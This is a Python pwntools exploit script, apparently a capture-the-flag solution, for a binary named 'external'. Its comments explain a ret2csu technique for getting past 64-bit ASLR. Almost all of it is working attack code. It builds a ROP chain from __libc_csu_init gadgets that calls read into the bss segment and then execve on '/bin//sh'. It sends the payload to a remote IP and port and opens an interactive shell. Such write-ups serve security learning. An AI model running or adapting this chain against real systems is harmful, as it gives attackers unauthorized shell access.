#!/usr/bin/env python3
#The binary has puts printf anything that would give us a info leak but after getting the user input it gonna use memset to destroy the GOT ..
#Returning there would give you a segmentation fault...A good thing among all the misery is that no this binary has no PIE and no stack canary..But a 64 bit ASLR is there
#So I searched google for 64 bit ASLR bypass...And there came a method called ret2csu.. After reading this blog...I swear it became one of my favourite
#ASLR bypass method...It exploits the dynmaic memory allocation which places lib_csu_init func in binary which does not randomize as it is part of binary as PIE is not present..
#which has 2 gadgets one which sets the value to registers and the other which sets the value to rdi rsi ..And a note this binary has two functions 
#write_syscall and exit_syscall that sets the eax for exit and write syscall and syscall instruction to execute syscall...But my method was to trigger read syscall and 
#then use the stored value to execve syscall 
#by returning to sycall instruction with eax to 0 and location of read where 
#to store the input would be bss where i am gonna store /bin/sh ,null and the pointer to  syscall instruction because call instruction in 
#return to csu gadget2 takes the address from the calculated value..

from pwn import *
e = ELF("./external")
r = remote("161.97.176.150",9999)
detonator = b'A' * 88
detonator+=p64(4199146)       #ret address of csu gadget 1
detonator+=p64(526277)        #rbx value for the call to init
detonator+=p64(526278)        #rbp value for the comparison of rbp,rbx+1 to pass
detonator+=p64(0)             #read syscall 1st arguement rdi=0x0 for stdin file descriptor
detonator+=p64(4210784)       #read syscall 2nd arguement rsi=0x404060 for bss address
detonator+=p64(59)            #read syscall 3rd arguement rdx=0x59 for the count to read
detonator+=p64(0)             #r15 value to 0
detonator+=p64(4199120)       #ret address of csu gadget 2
detonator+=b'A' * 8           #junk value (never mind)
detonator+=p64(526350)        #rbx value to our string given using read which would now have the address to syscall to call when we are in csu gadget 2's call
detonator+=p64(526351)        #rbp value for the comparison of rbp,rbx+1
detonator+=p64(4210784)       #execve syscall 1st arguement rdi=0x404060
detonator+=b'\x00' * 24        #execve syscall 2nd and 3rd value to zeroes and r15 value to 0
detonator+=p64(4199043)       #ret to syscall gagdet
detonator+=p64(4199120)       #ret to csu gadget 2
detonator+=b'\x41' * 15
r.sendline(detonator)
time.sleep(0.5)
bomb = b'/bin//sh' + b'\x00' * 8 + b'\x83\x12\x40\x00\x00\x00\x00\x00' + b'\x00' * 34 #The string '/bin//sh' is the 1st arg to /bin//sh and the address is for the call in                                                                                      #csu gadget 2 'call'
r.sendline(bomb)
r.interactive()
